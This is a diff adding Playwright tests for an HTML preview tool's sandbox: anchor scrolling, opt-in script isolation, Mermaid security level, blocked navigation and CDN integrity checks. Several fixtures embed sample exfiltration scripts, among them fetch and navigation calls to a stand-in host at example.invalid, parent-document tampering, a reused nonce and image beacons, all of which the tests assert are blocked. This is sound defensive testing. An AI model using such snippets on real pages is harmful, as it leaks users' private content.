@@ -162,6 +162,33 @@ def test_preview_works_offline_and_reload_clears_input(browser_page):
     playwright.expect(page.locator("#preview-empty")).to_be_visible()
 
 
+def test_preview_scrolls_local_anchors_without_navigation(browser_page):
+    page = browser_page
+    requests = []
+    page.context.route(
+        "**/*", lambda route: (requests.append(route.request.url), route.abort())
+    )
+    frame = render(
+        page,
+        '<a href="#%E7%9B%AE%E6%AC%A1">Jump</a>'
+        '<a href="https://example.invalid/#target">External</a>'
+        '<a href="#%ZZ">Malformed</a>'
+        '<div style="height:4000px"></div><h2 id="目次">Destination</h2>',
+    )
+    link = frame.get_by_role("link", name="Jump", exact=True)
+    playwright.expect(link).to_have_attribute("tabindex", "0")
+    link.click()
+    assert page.frames[1].evaluate("scrollY") > 0
+    page.frames[1].evaluate("scrollTo(0, 0)")
+    link.focus()
+    link.press("Enter")
+    assert page.frames[1].evaluate("scrollY") > 0
+    playwright.expect(frame.locator("a[href]")).to_have_count(0)
+    playwright.expect(frame.get_by_role("link")).to_have_count(1)
+    assert page.frames[1].url == "about:srcdoc"
+    assert requests == []
+
+
 def test_preview_loads_only_approved_styles_with_integrity(browser_page):
     page = browser_page
     asset = CDN_ASSETS["styles"][0]
@@ -293,3 +320,135 @@ def test_preview_responsive_switching(browser_page, width, height):
         == 0
     )
     assert errors == []
+
+
+def test_opt_in_scripts_run_without_parent_storage_or_network_access(browser_page):
+    page = browser_page
+    requests = []
+    page.context.route(
+        "**/*", lambda route: (requests.append(route.request.url), route.abort())
+    )
+    page.locator("#execute-scripts").check()
+    frame = render(
+        page,
+        '<button id="increment">Add</button><p id="count" data-n="4"></p>'
+        '<script>const count=document.getElementById("count");'
+        "count.textContent=count.dataset.n;"
+        'document.getElementById("increment").onclick=()=>count.textContent++;'
+        'try{parent.document.body.dataset.compromised="yes"}catch(e){}'
+        'try{localStorage.setItem("private","value")}catch(e){}'
+        'fetch("/leak-script").catch(()=>{});'
+        'fetch("https://example.invalid/leak").catch(()=>{});'
+        'const s=document.createElement("script");s.nonce=document.currentScript.nonce;'
+        's.src="/leak-nonce";document.head.appendChild(s);'
+        'const img=new Image();img.src="/leak-image";'
+        "</script>",
+    )
+    playwright.expect(frame.locator("#count")).to_have_text("4")
+    frame.get_by_role("button", name="Add").click()
+    playwright.expect(frame.locator("#count")).to_have_text("5")
+    page.wait_for_timeout(100)
+    assert requests == []
+    assert page.evaluate("document.body.dataset.compromised") is None
+    assert page.evaluate("localStorage.length + sessionStorage.length") == 0
+    page.context.unroute("**/*")
+    page.reload()
+    playwright.expect(page.locator("#execute-scripts")).not_to_be_checked()
+
+
+def test_opt_in_scripts_can_use_preloaded_real_mermaid(browser_page, mermaid_bundle):
+    page = browser_page
+    page.context.route(
+        CDN_ASSETS["mermaid"]["url"],
+        lambda route: route.fulfill(
+            body=mermaid_bundle,
+            content_type="text/javascript",
+            headers={"Access-Control-Allow-Origin": "*"},
+        ),
+    )
+    page.locator("#execute-scripts").check()
+    frame = render(
+        page,
+        '<pre class="mermaid">graph TD\n A[Start] --> B[Finish]</pre>'
+        '<script>mermaid.initialize({startOnLoad:false,securityLevel:"loose"});'
+        'mermaid.run({nodes:document.querySelectorAll(".mermaid")});</script>',
+    )
+    playwright.expect(frame.locator(".mermaid svg")).to_contain_text(
+        "Start", timeout=15000
+    )
+    playwright.expect(page.locator("#preview-status")).to_have_text("Preview updated.")
+    assert (
+        page.frames[1].evaluate("mermaid.mermaidAPI.getConfig().securityLevel")
+        == "strict"
+    )
+
+
+@pytest.mark.parametrize(
+    "destination", ["/html-preview?leak=private", "https://example.invalid/leak"]
+)
+def test_opt_in_scripts_cannot_navigate_to_send_content(browser_page, destination):
+    page = browser_page
+    requests = []
+    page.context.route(
+        "**/*", lambda route: (requests.append(route.request.url), route.abort())
+    )
+    page.locator("#execute-scripts").check()
+    render(page, f'<p>Private</p><script>location.href="{destination}"</script>')
+    page.wait_for_timeout(150)
+    assert requests == []
+    assert page.url.endswith("/html-preview")
+
+
+@pytest.mark.parametrize("scripts_enabled", [False, True])
+def test_approved_google_font_is_pinned_and_bad_integrity_keeps_html(
+    browser_page, scripts_enabled
+):
+    page = browser_page
+    font = CDN_ASSETS["webfonts"][1]
+    requests = []
+
+    def modified_font(route):
+        requests.append(route.request.url)
+        route.fulfill(
+            body=b"modified font",
+            headers={"Access-Control-Allow-Origin": "*"},
+        )
+
+    page.context.route("**/*", modified_font)
+    page.locator("#execute-scripts").set_checked(scripts_enabled)
+    frame = render(
+        page,
+        '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?'
+        'family=JetBrains+Mono:wght@400;600&amp;display=swap">'
+        "<p>Readable fallback</p>",
+    )
+    playwright.expect(frame.locator("p")).to_have_text("Readable fallback")
+    playwright.expect(page.locator("#preview-status")).to_have_text(
+        "A CDN could not load or Mermaid could not render. "
+        "Check your connection and diagram syntax."
+    )
+    assert requests == [font["url"]]
+
+
+def test_opt_in_styles_are_loaded_by_parent_with_integrity(browser_page):
+    page = browser_page
+    asset = CDN_ASSETS["styles"][0]
+    requests = []
+
+    def stylesheet(route):
+        requests.append(route.request.frame.parent_frame)
+        route.fulfill(
+            body=(ROOT / "static" / "bootstrap.min.css").read_bytes(),
+            content_type="text/css",
+            headers={"Access-Control-Allow-Origin": "*"},
+        )
+
+    page.context.route(asset["url"], stylesheet)
+    page.locator("#execute-scripts").check()
+    frame = render(
+        page,
+        f'<link rel="stylesheet" href="{asset["url"]}">'
+        '<div class="d-flex">Bootstrap</div>',
+    )
+    playwright.expect(frame.locator("div")).to_have_css("display", "flex")
+    assert requests == [None]
